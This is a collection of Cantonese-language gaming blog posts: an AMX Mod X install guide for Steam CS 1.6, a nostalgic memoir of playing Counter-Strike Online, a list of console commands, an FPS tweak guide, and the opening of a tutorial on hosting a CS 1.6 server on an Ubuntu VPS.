    <title>Counter-Strike 1.6 - 於 Steam CS 安裝 AMX X Mod (Windows)</title>
    <url>/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要喺 1.6 度玩唔同既 Mod，<br>我地需要用到 AMXX，<br>然後今篇文係講點樣裝 AMXX。</p>
<p>今篇文係講喺你既 Steam CS 入面裝。</p>
<p>另外，因為今篇係用 Windows 裝，<br>Linux 用家需要安裝另一個檔案。</p>
<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>我地需要 3個檔案，<br>我地去 AMXX 官網下載。</p>
<p>記得有 Windows 版本就裝返 Windows 版本。</p>
<ul>
<li><a href="https://www.amxmodx.org/release/amxmodx-1.8.2-cstrike-windows.zip">Counter-Strike Addon Windows</a></li>
<li><a href="https://www.amxmodx.org/release/amxmodx-1.8.2-base-windows.zip">AMX Mod X Base Winodws</a></li>
<li><a href="https://www.amxmodx.org/release/metamod-1.21.1-am.zip">Metamod</a></li>
</ul>
<p><a href="https://www.amxmodx.org/downloads.php">https://www.amxmodx.org/downloads.php</a></p>
<img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/amxx_d_1.png" class="">

<p>下載完哂三個你會發現都係 zip 檔案黎，<br>呢度要留意返個次序，</p>
<p>注意 :<br>然後 metamod 就可以唔洗分次序，<br>base 一定係要解壓先過 cstrike。</p>
<h3 id="Unzip-base-再-Unzip-cstrike"><a href="#Unzip-base-再-Unzip-cstrike" class="headerlink" title="Unzip base 再 Unzip cstrike"></a>Unzip base 再 Unzip cstrike</h3><p>我地先 unzip base，<br>然後再 unzip cstrike。</p>
<p>記得要 用 cstrike replace base 既 files。</p>
<img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/unzip-1.gif" class="">

<h3 id="Unzip-Metamod-無分次序"><a href="#Unzip-Metamod-無分次序" class="headerlink" title="Unzip Metamod (無分次序)"></a>Unzip Metamod (無分次序)</h3><img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/unzip-2.gif" class="">

<h3 id="將-addons-copy-去-cstrike-內"><a href="#將-addons-copy-去-cstrike-內" class="headerlink" title="將 addons copy 去 cstrike 內"></a>將 addons copy 去 cstrike 內</h3><p>完成之後去返 你既 <code>\Steam\steamapps\common\Half-Life\cstrike</code> 路徑，<br>將你岩岩解壓完既 <code>addons</code>，<br>成個擺入去 cstrike 入面。</p>
<img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/copy-1.gif" class="">

<h3 id="建立-plugins-ini-檔案"><a href="#建立-plugins-ini-檔案" class="headerlink" title="建立 plugins.ini 檔案"></a>建立 plugins.ini 檔案</h3><p>我地喺 <code>\Steam\steamapps\common\Half-Life\cstrike\addons\metamod</code> 入面，<br>如果搵唔到一個檔案叫 <code>plugins.ini</code><br>咁就新增一個檔案叫 <code>plugins.ini</code></p>
<img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/create-1.gif" class="">

<h3 id="新增-win32"><a href="#新增-win32" class="headerlink" title="新增 win32"></a>新增 win32</h3><p>我地再將岩岩新增左既檔案，<br>喺入面打一行叫。</p>
<p>要跟返呢個路徑 <code>Steam\steamapps\common\Half-Life\cstrike\addons\metamod\dlls</code> 入面既 <code>metamod.dll</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win32 addons\amxmodx\dlls\amxmodx_mm.dll</span><br></pre></td></tr></table></figure>

<img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/add-1.gif" class="">

<h3 id="修改-liblist-gam-檔案"><a href="#修改-liblist-gam-檔案" class="headerlink" title="修改 liblist.gam 檔案"></a>修改 liblist.gam 檔案</h3><p>入去 <code>Steam\steamapps\common\Half-Life\cstrike</code>，<br>搵一個檔案叫 <code>liblist.gam</code><br>再將入面第 14 行既原本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gamedll &quot;dlls\mp.dll&quot;</span><br></pre></td></tr></table></figure>

<p>改做</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gamedll &quot;addons\metamod\dlls\metamod.dll&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/edit-1.gif" class="">

<h3 id="完成-測試"><a href="#完成-測試" class="headerlink" title="完成 (測試)"></a>完成 (測試)</h3><p>搞掂哂以上既野就已經完成安裝 AMXX，<br>你可以開你既 Cs1.6，<br>然後 New Games 睇下有冇反應。</p>
<p>我地分別打兩個指令<br><code>meta list</code></p>
<p>Result :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meta list</span><br><span class="line">Currently loaded plugins:</span><br><span class="line">      description      stat pend  file              vers      src  load  unlod</span><br><span class="line"> [ 1] AMX Mod X        RUN   -    amxmodx_mm.dll    v1.8.2    ini  Start ANY  </span><br><span class="line"> [ 2] Fun              RUN   -    fun_amxx.dll      v1.8.2    pl1  ANY   ANY  </span><br><span class="line"> [ 3] CStrike          RUN   -    cstrike_amxx.dll  v1.8.2    pl1  ANY   ANY  </span><br><span class="line"> [ 4] CSX              RUN   -    csx_amxx.dll      v1.8.2    pl1  ANY   ANY  </span><br><span class="line">4 plugins, 4 running</span><br></pre></td></tr></table></figure>

<p><code>amxx plugins</code></p>
<p>Result :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">amxx plugins</span><br><span class="line">Currently loaded plugins:</span><br><span class="line">       name                    version     author            file             status   </span><br><span class="line"> [  1] Admin Base              1.8.2       AMXX Dev Team     admin.amxx       running  </span><br><span class="line"> [  2] Admin Commands          1.8.2       AMXX Dev Team     admincmd.amxx    running  </span><br><span class="line"> [  3] Admin Help              1.8.2       AMXX Dev Team     adminhelp.amxx   running  </span><br><span class="line"> [  4] Slots Reservation       1.8.2       AMXX Dev Team     adminslots.amxx  running  </span><br><span class="line"> [  5] Multi-Lingual System    1.8.2       AMXX Dev Team     multilingual.am  running  </span><br><span class="line"> [  6] Menus Front-End         1.8.2       AMXX Dev Team     menufront.amxx   running  </span><br><span class="line"> [  7] Commands Menu           1.8.2       AMXX Dev Team     cmdmenu.amxx     running  </span><br><span class="line"> [  8] Players Menu            1.8.2       AMXX Dev Team     plmenu.amxx      running  </span><br><span class="line"> [  9] Maps Menu               1.8.2       AMXX Dev Team     mapsmenu.amxx    running  </span><br><span class="line"> [ 10] Plugin Menu             1.8.2       AMXX Dev Team     pluginmenu.amxx  running  </span><br><span class="line"> [ 11] Admin Chat              1.8.2       AMXX Dev Team     adminchat.amxx   running  </span><br><span class="line"> [ 12] Anti Flood              1.8.2       AMXX Dev Team     antiflood.amxx   running  </span><br><span class="line"> [ 13] Scrolling Message       1.8.2       AMXX Dev Team     scrollmsg.amxx   running  </span><br><span class="line"> [ 14] Info. Messages          1.8.2       AMXX Dev Team     imessage.amxx    running  </span><br><span class="line"> [ 15] Admin Votes             1.8.2       AMXX Dev Team     adminvote.amxx   running  </span><br><span class="line"> [ 16] NextMap                 1.8.2       AMXX Dev Team     nextmap.amxx     running  </span><br><span class="line"> [ 17] Nextmap Chooser         1.8.2       AMXX Dev Team     mapchooser.amxx  running  </span><br><span class="line"> [ 18] TimeLeft                1.8.2       AMXX Dev Team     timeleft.amxx    running  </span><br><span class="line"> [ 19] Pause Plugins           1.8.2       AMXX Dev Team     pausecfg.amxx    running  </span><br><span class="line"> [ 20] Stats Configuration     1.8.2       AMXX Dev Team     statscfg.amxx    running  </span><br><span class="line"> [ 21] StatsX                  1.8.2       AMXX Dev Team     statsx.amxx      running  </span><br><span class="line">21 plugins, 21 running</span><br></pre></td></tr></table></figure>

<img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/result-1.gif" class="">


<h3 id="This-Server-is-Using-AMX-Mod-X"><a href="#This-Server-is-Using-AMX-Mod-X" class="headerlink" title="This Server is Using AMX Mod X"></a>This Server is Using AMX Mod X</h3><p>完成。</p>
<img src="/2022/05/31/Counter-Strike-1.6%20Steam%20CS%20Local%20install%20AMXX(Windows)/amxx_gameplay.png" class="">]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
      </tags>
  </entry>
  <entry>
    <title>CSO 回憶至今 第一章 | 2009年-2010年</title>
    <url>/2022/01/27/Counter-Strike-Online-Person-feels/</url>
    <content><![CDATA[<img src="/2022/01/27/Counter-Strike-Online-Person-feels/bg.png" class="">

<h1 id="樓豬"><a href="#樓豬" class="headerlink" title="樓豬"></a>樓豬</h1><p>Counter Strike Online，簡稱係叫做 CSO，<br>呢隻 Games 雖然已經唔再係以前我熟悉既 CSO，<br>但係佢俾我既童年係非常之咁深刻，<br>CSO 都係我頭四隻 Games 既熱愛遊戲之一，<br>幾乎成個小學都係佢陪住我大過，<br>另外仲有就係 cs1.6，主要都係 CSO 同 CS1.6，</p>
<p>點解我會出個 CSO Post？<br>其實原因好簡單，<br>因為曾經既我，<br>我係非常之咁鐘意玩呢隻遊戲，<br>出於個人感情，私心，<br>即使我已經唔會再想返去而加呢個年代既 CSO，<br>我都想好好咁記錄下我個陣時既野，<br>但細個既我仲未好似而加咁，<br>識得整片，寫Program，打 Commands，<br>更加唔好話錄片，</p>
<p>但係而加既我已經今時唔同往日，<br>如果當時既我識得錄片，<br>我真係回返轉頭錄片，<br>個陣既回憶已經返唔到去，<br>就算我想睇返，<br>都只可以睇到網上其他人以前既片，<br>如果可以返去個陣就好啦。</p>
<img src="/2022/01/27/Counter-Strike-Online-Person-feels/mg3.png" class="">

<h1 id="2009年-深刻回憶"><a href="#2009年-深刻回憶" class="headerlink" title="2009年 深刻回憶"></a>2009年 深刻回憶</h1><image src="基因藥水.png"/>

<p>仲係入世未深既我，<br>基於個個 IE 年代科技仲未話好發達，<br>邊似而加咁樣可以用 Google Serach到咁多野，<br>都係用 msn 呀 vlan 呀 skype 呀 咁樣，</p>
<p>我仲記得我岩岩玩個陣係岩岩出基因藥水，<br>個陣覺得，嘩屌，買完喺屍場跳得咁撚高既！<br>加上個陣我玩有 90% 時間都係玩緊屍場，<br>更加係好撚正，<br>但係我望一望，<br>要用點數 wor 屌，<br>但係點買呢？<br>個陣我岩岩接觸又唔識，<br>所以一開頭我都係冇用點數玩 cso…</p>
<p>仲記得我有一日，<br>個陣係打緊夜場屍場，<br>我玩緊 Italy (意大利巷戰)，<br>有玩既大家都知有個位係好好守，<br>但係要上去就要跳兩層咁上去，<br>加上要上去就要用到藥水 …<br>就咁普通重力 800，<br>係上唔到 …<br>但係我又冇藥水 …<br>跳唔到上去，<br>加上我又唔識得買點數再買基因藥水 :(<br>咁我就唔知痴左邊條根，<br>我做幫人上個個，<br>個陣個撚個係撚哂下面，<br>可能個個都冇基因藥水既關係啦，<br>上唔到去上面，<br>呢個位又安全咁多，</p>
<p>我就去左佢下面，<br>撳實 Ctrl 再 係度上下 fing mouse，<br>示意叫人跳我個頭上去，<br>就係咁我好似幾乎幫哂下面既所有人上去，<br>幾多我都唔記得左，<br>話哂都已經成13年前 (2009年)<br>之後啲屍黎到，<br>我緊係第一個死啦 - -<br>不過個陣其實我又冇所謂既，<br>玩得開心咪得囉，<br>我根本唔撚 care 咁樣死法，<br>都唔錯吖，<br>係咪先？</p>
<p>完左場之後，<br>我去我個 個人狀態度睇，<br>我發現多左啲野，<br>見到禮物盒有樣野 …<br>嘩屌原來係有人送左我野，<br>送左啲乜？<br>係一日既全套槍俾我 …<br>雖然得1日，<br>但係我個陣真係好撚開心，<br>唔撚識講，<br>我仲記得當時我開心到同全家人講，<br>我做好心幫人上去守位，<br>之後完左場收到禮物，<br>呢個禮物係我意料之外，<br>真係估都估唔到 …<br>呢啲係咪叫好心有好報？<br>其實我都唔知點解會記呢樣野記到而加，<br>但係對我黎講真係好撚深刻！！</p>
<p>呢段回憶只係我其中一段 …<br>後來既樓豬我，<br>見到影片上，<br>喺街場見到有人跳得好勁，<br>因為咁，<br>我又學住佢咁跳，<br>跳跳下我都算跟到啲<br>我慢慢咁學識 BJ (連跳)，<br>成為左當時其中一位俾人覺得好勁既玩家，<br>但呢啲事已經係我一年後既事(?)<br>我都唔記得左幾時啦 ;)<br>識到一班都係好勁跳既人，</p>
<h1 id="藍箱"><a href="#藍箱" class="headerlink" title="藍箱"></a>藍箱</h1><img src="藍箱.png"/>

<p>藍箱，以前叫法<br>後尾，因為人地以為藍箱係出面 CT 個藍箱<br>但其實我地講緊既係 TR 入面個藍箱，</p>
<p>以前呢個位識跳已經好勁，<br>你已經係成個 Server Top 5% 既人 LMAO<br>我就係識跳呀，吹咩 haha</p>
<p>個陣識到一班人都係好鐘意守藍箱，<br>之後加左好友，<br>個陣 Youtube又岩岩 hit 起，<br>我見到原來佢地有部分人係有指教學片丶拍片 - -<br>但當時既我又冇諗住同佢地話，<br>“原來你有喺 Youtube出片架？”<br>廢時搞啦 xd<br>識左邊個就唔係度講，<br>但我想講既係，<br>呢隻 games 令我識到好多人，<br>俾到我既回憶都係好多，<br>好多深刻位置，<br>加上又唔想自爆自己係邊位啦 xd<br>CSO 係隻好好玩既 Game，<br>雖然佢係隻多小學雞，<br>出名要洗好多錢既 Game，<br>但其實我個陣玩都唔係洗左好多錢玩，<br>個陣用技術係足以屌打好多人，<br>邊似而加咁，<br>星球大戰咁款 - -</p>
<p>講起小學雞，<br>以前我都係個小學雞，<br>但大部分小學雞都係有幾樣共通點，</p>
<ul>
<li>玩唔起 (唔識跳藍箱，之後我喺呢 Round 守完藍箱下 Round 會踢人)</li>
<li>唔識打中文 (成撚日話 on99 … etc)</li>
<li>鐘意做埋啲小動作 (卡人，唔俾人跳)<br>啲小學雞就係最撚鐘意喺下 Round 踢人，<br>之後喺 chatroom 話 f3f3f3f3 … LMAO<br>點解係 f3?<br>因為 cso 踢人係用 vote 制度，<br>%高就踢到條友<br>f3 係讚成 (是)<br>f4 係反對 (否)</li>
</ul>
<p>我呢啲人個陣緊係成日俾人踢啦- -<br>但我都預撚左架啦，<br>無計啦，<br>個陣小學雞地球 xdd<br>而我就係小部分既小學雞<br>個三樣野我冇一樣會做 LOL<br>以前係，而加都係，從來都係小部分既人。</p>
<p>個陣仲要未識啲人呢，<br>有時單拖入去玩，<br>又俾人踢，<br>啲仆街小學雞又會一齊 F3，<br>搞搞下場場都玩唔過一 Round - -<br>都戇鳩鳩 - -</p>
<p>另外呢，<br>除左 cso 之外，<br>仲有好幾隻 game 都對我有好大既深刻印象，<br>等我遲啲再出個 Post 打感受先。</p>
<p>包括係</p>
<ul>
<li>Counter Strike Online</li>
<li>Counter Strike 1.6</li>
<li>AVA 戰地之王</li>
<li>Left 4 Dead 2</li>
</ul>
<p>打住咁多先 haha<br>有心情再繼續 :o)</p>
<h2 id="Halohalo"><a href="#Halohalo" class="headerlink" title=":Halohalo"></a>:Halohalo</h2><p>呢篇唔係教學文，唔係電腦文，呢篇係記錄下我叫春既一篇文 :p</p>
]]></content>
      <categories>
        <category>樓豬鐘意叫春</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Counter Strike Online</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter Strike Online - 主控台指令</title>
    <url>/2022/01/27/Counter-Strike-Online-Commands/</url>
    <content><![CDATA[<p><img src="bg.png" alt="CSO"></p>
<h1 id="FPS-On-Off"><a href="#FPS-On-Off" class="headerlink" title="FPS On / Off"></a>FPS On / Off</h1><blockquote>
<p>左上角顯示 FPS 開關<br>打 0 或 1 開關<br>1 係開<br>0 係熄</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_showfps 1</span><br></pre></td></tr></table></figure>

<h1 id="隻-Game-既場既光度"><a href="#隻-Game-既場既光度" class="headerlink" title="隻 Game 既場既光度"></a>隻 Game 既場既光度</h1><blockquote>
<p>預設 1 最大 3.5</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brightness 1</span><br></pre></td></tr></table></figure>

<h1 id="背景音效音樂音量"><a href="#背景音效音樂音量" class="headerlink" title="背景音效音樂音量"></a>背景音效音樂音量</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bgmvolume 0</span><br></pre></td></tr></table></figure>

<h1 id="隊友頭部顯示名稱"><a href="#隊友頭部顯示名稱" class="headerlink" title="隊友頭部顯示名稱"></a>隊友頭部顯示名稱</h1><blockquote>
<p>打 0 或 1 開關<br>1 係開<br>0 係熄</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_headname 1</span><br></pre></td></tr></table></figure>

<h1 id="單一人物模組"><a href="#單一人物模組" class="headerlink" title="單一人物模組"></a>單一人物模組</h1><blockquote>
<p>打 0 或 1 開關<br>1 係開<br>0 係熄</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_minmodels 1</span><br></pre></td></tr></table></figure>

<h1 id="天氣效果"><a href="#天氣效果" class="headerlink" title="天氣效果"></a>天氣效果</h1><blockquote>
<p>0=關閉、1=毛雨、2=下雨、3=大雨</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_weather 2</span><br></pre></td></tr></table></figure>

<h1 id="使用舊式購買選單"><a href="#使用舊式購買選單" class="headerlink" title="使用舊式購買選單"></a>使用舊式購買選單</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_oldbuy 1</span><br></pre></td></tr></table></figure>

<h1 id="屍體停留時間"><a href="#屍體停留時間" class="headerlink" title="屍體停留時間"></a>屍體停留時間</h1><p>個條屍淨係留 50秒</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_corpsestay 50</span><br></pre></td></tr></table></figure>

<h1 id="左右手顯示"><a href="#左右手顯示" class="headerlink" title="左右手顯示"></a>左右手顯示</h1><blockquote>
<p>1 係左<br>0 係右</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_righthand 1</span><br></pre></td></tr></table></figure>

<h1 id="動態準星"><a href="#動態準星" class="headerlink" title="動態準星"></a>動態準星</h1><blockquote>
<p>準星會隨著你既狀態而縮大縮細</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_dynamiccrosshair 1</span><br></pre></td></tr></table></figure>

<h1 id="消除下雨聲音"><a href="#消除下雨聲音" class="headerlink" title="消除下雨聲音"></a>消除下雨聲音</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stopsound</span><br></pre></td></tr></table></figure>

<h1 id="雷達模式"><a href="#雷達模式" class="headerlink" title="雷達模式"></a>雷達模式</h1><blockquote>
<p>0 係透明<br>1 係實底色</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_radartype 1</span><br></pre></td></tr></table></figure>

<h1 id="玩家陰影"><a href="#玩家陰影" class="headerlink" title="玩家陰影"></a>玩家陰影</h1><blockquote>
<p>1 係開<br>0 係關</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_shadows 1</span><br></pre></td></tr></table></figure>

<h1 id="觀察模式準星"><a href="#觀察模式準星" class="headerlink" title="觀察模式準星"></a>觀察模式準星</h1><blockquote>
<p>0 係熄<br>1 係開</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_observercrosshair 1</span><br></pre></td></tr></table></figure>

<h1 id="準星顏色"><a href="#準星顏色" class="headerlink" title="準星顏色"></a>準星顏色</h1><blockquote>
<p>設定值係 RGB</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_crosshair_color 255 255 0</span><br></pre></td></tr></table></figure>

<h1 id="半透明準心"><a href="#半透明準心" class="headerlink" title="半透明準心"></a>半透明準心</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">＊cl_crosshair_translucent</span><br></pre></td></tr></table></figure>

<h1 id="準心大小"><a href="#準心大小" class="headerlink" title="準心大小"></a>準心大小</h1><blockquote>
<p>可以 0 ,1 ,2 ,3 或 auto ,small ,medium ,large 設定</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_crosshair_size auto</span><br></pre></td></tr></table></figure>

<h1 id="FPS-遊戲最大輸出"><a href="#FPS-遊戲最大輸出" class="headerlink" title="FPS 遊戲最大輸出"></a>FPS 遊戲最大輸出</h1><blockquote>
<p>Default 係 72<br>如果你要用 99，要去熄左呢個程式既垂直同步再重新開 Games 先得。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fps_max 99</span><br></pre></td></tr></table></figure>

<h1 id="煙霧效果"><a href="#煙霧效果" class="headerlink" title="煙霧效果"></a>煙霧效果</h1><blockquote>
<p>(0、1、2) 煙霧效果，0=最佳逼真、1=普通、2=最差</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastsprites</span><br></pre></td></tr></table></figure>

<h1 id="光亮度"><a href="#光亮度" class="headerlink" title="光亮度"></a>光亮度</h1><blockquote>
<p>預設值為2.5</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gamma 3</span><br></pre></td></tr></table></figure>

<h1 id="Direct3D-模式開關反方向渲染"><a href="#Direct3D-模式開關反方向渲染" class="headerlink" title="Direct3D 模式開關反方向渲染"></a>Direct3D 模式開關反方向渲染</h1><blockquote>
<p>0 係熄<br>1 係開</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gl_d3dflip</span><br></pre></td></tr></table></figure>

<h1 id="畫面上各個模型連接的部分的連串渲染"><a href="#畫面上各個模型連接的部分的連串渲染" class="headerlink" title="畫面上各個模型連接的部分的連串渲染"></a>畫面上各個模型連接的部分的連串渲染</h1><blockquote>
<p>0 係熄<br>1 係開</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gl_clear</span><br></pre></td></tr></table></figure>

<p>參考資料<br><a href="https://forum.gamer.com.tw/Co.php?bsn=11902&amp;sn=707336">https://forum.gamer.com.tw/Co.php?bsn=11902&amp;sn=707336</a></p>
]]></content>
      <categories>
        <category>Counter Strike Online</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Games</tag>
        <tag>Counter Strike Online</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike 開啟 FPS 99</title>
    <url>/2022/06/01/Counter-Strike-enabled-99FPS/</url>
    <content><![CDATA[<img src="/2022/06/01/Counter-Strike-enabled-99FPS/cover.png" class="">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>對於要跳 KZ 的人來說，<br>99 FPS 是必要的。</p>
<p>加上如果只有 60 FPS，<br>玩起來也會不順暢，<br>所以今篇今是要講如何將 FPS 強制轉到 99 FPS。</p>
<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>我們先開啟遊戲指令台輸入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl_showfps 1</span><br></pre></td></tr></table></figure>

<img src="/2022/06/01/Counter-Strike-enabled-99FPS/60fps.png" class="">

<p>從右上角中可以看到只有 60FPS，<br>接下來我們開始進行修改。</p>
<h2 id="NVDIA"><a href="#NVDIA" class="headerlink" title="NVDIA"></a>NVDIA</h2><p>我們需要 NVDIA 控制面板去進行修改，<br>先到你的桌面按下右鍵，再按 NVDIA 控制面板，<br>將遊戲的程式設定內的 <code>垂直同步</code> 關閉再套用。</p>
<img src="/2022/06/01/Counter-Strike-enabled-99FPS/how.gif" class="">

<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>重新開啟遊戲就會出現 99FPS。</p>
<img src="/2022/06/01/Counter-Strike-enabled-99FPS/99fps.png" class="">]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu VPS Server - 建立 Counter Strike 1.6 伺服器並廿四小時開放不停止</title>
    <url>/2021/12/11/Cs1-6-server-create-vps-wan/</url>
    <content><![CDATA[<p><img src="/img/Post/image/cs1.6/CS.jpg"></p>
<h1 id="開啟伺服器需求"><a href="#開啟伺服器需求" class="headerlink" title="開啟伺服器需求"></a>開啟伺服器需求</h1><p>如果想自己開 CS 1.6 server 又想俾其他人入到嚟，通常你係要開放自己部機嘅 Public IP (Wan Network) 先得，<br>但係用自己部機嘅 IP 嚟開 server 實在太唔安全，所以今次我哋會用 VPS hosting 代替，<br>呢篇文會示範點樣用 <a href="https://www.digitalocean.com/">DigitalOcean</a> 嘅 VPS 喺 Linux 系統下架設一個 CS 1.6 Server<br>將會用到以下工具：</p>
<ul>
<li>VPS Server (Linux) - 512 RAM 配置，CS需要嘅配置係非常低，所以用最廢嘅配置都足夠有餘</li>
<li>SSH - 連接伺服器工具 (必要)</li>
<li>Filezilla - GUI 版本傳輸檔案嘅工具 (上/下載) (可選)</li>
<li>SCP - 指令版本傳輸檔案工具 (可選)</li>
<li>Screen - 讓伺服器程式可以在後台運行 (必要)</li>
<li>metamod - CS 1.6 3rd party mod 嘅原祖，可以用 C++ 寫 metamod plugin</li>
<li>amxmodx - 都係 3rd party mod，係用 metamod 寫成嘅，最大分別係可以寫 pawn script 做成 amxx plugin，方便同易過 metamod 好多 (網上大部可以搵到嘅插件都係 amxx 格式)</li>
</ul>
<p>Q : 至於點樣申請VPS ?<br>A : 我寫左個 Post 係講點用 Digitalocean 起一部 VPS Server：<a href="/2022/07/10/Digitalocean-create-droplets-cloud-server-vps/">Digitalocean - 建立 Droplets VPS Server</a></p>
<h1 id="第一步-安裝-SSH-工具喺你部電腦"><a href="#第一步-安裝-SSH-工具喺你部電腦" class="headerlink" title="第一步 - 安裝 SSH 工具喺你部電腦"></a>第一步 - 安裝 SSH 工具喺你部電腦</h1><p>請你先起左一部 VPS Server，唔識既人可以睇下我上面個個 Post。</p>
<p>另外，我會用 ubuntu 20.02 LTS x64 示範。</p>
<p>我地需要用 SSH 登入呢部 Server，所以我地呢個步驟係要將你而加部機裝個可以連接到 SSH 既工具，然後會喺入面進行所有指令操作。</p>
<ul>
<li>Windows 10/11 系統原本已經預設有 SSH 連接工具，</li>
<li>Linux 系統大部分都已經預設有 SSH 連接工具。</li>
</ul>
<p>Debian :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ssh -y</span><br></pre></td></tr></table></figure>

<p>Arch :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ssh</span><br></pre></td></tr></table></figure>

<p>Fedora :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dnf install ssh</span><br></pre></td></tr></table></figure>

<h2 id="第二步-登入-SSH-Server"><a href="#第二步-登入-SSH-Server" class="headerlink" title="第二步 - 登入 SSH Server"></a>第二步 - 登入 SSH Server</h2><p>打左句指令 enter 之後佢會問你係咪繼續連接呢部 Server，咁我地打 <code>yes</code> 繼續。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@your_server_ip</span><br></pre></td></tr></table></figure>

<p><img src="connect-1.gif"></p>
<h1 id="第三步-SSH-Port-Accept"><a href="#第三步-SSH-Port-Accept" class="headerlink" title="第三步 - SSH Port Accept"></a>第三步 - SSH Port Accept</h1><p>然後我地要將你既 Default Reject Port22 登入既開返做 Accept<br>呢個動作係為左唔好令你日後入返個 VPS Server 會 Reject左你既登入。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure>

<h1 id="第四步-防火牆設置-Open-UDP-Port"><a href="#第四步-防火牆設置-Open-UDP-Port" class="headerlink" title="第四步 - 防火牆設置 Open UDP Port"></a>第四步 - 防火牆設置 Open UDP Port</h1><div class="note info flat">
    說明：啟動佢佢警告你呢個指令可能會中斷而加有既 SSH 連線，咁你輸入 <code>y</code> 繼續就可以。
</div>

<p>原本 <code>ufw</code> 係預設會熄左，輸入以下指令啟動 <code>ufw</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure>

<p><img src="ufw-1.png"></p>
<h2 id="開放-UDP-Port"><a href="#開放-UDP-Port" class="headerlink" title="開放 UDP Port"></a>開放 UDP Port</h2><p>開放 27015 UDP Port：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 27015/udp</span><br></pre></td></tr></table></figure>

<p><img src="ufw-2.png"></p>
<h1 id="第五步-安裝-steamcmd"><a href="#第五步-安裝-steamcmd" class="headerlink" title="第五步 - 安裝 steamcmd"></a>第五步 - 安裝 steamcmd</h1><p>喺裝之前，請將部機既 apt-get package manager 更新先 ~</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br></pre></td></tr></table></figure>
<p><img src="apt-1.png"></p>
<h2 id="x64-系統"><a href="#x64-系統" class="headerlink" title="x64 系統"></a>x64 系統</h2><p>如果部機係用緊 x64 bit，咁請你跟住以下既步驟加入 multiverse：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository multiverse</span><br></pre></td></tr></table></figure>

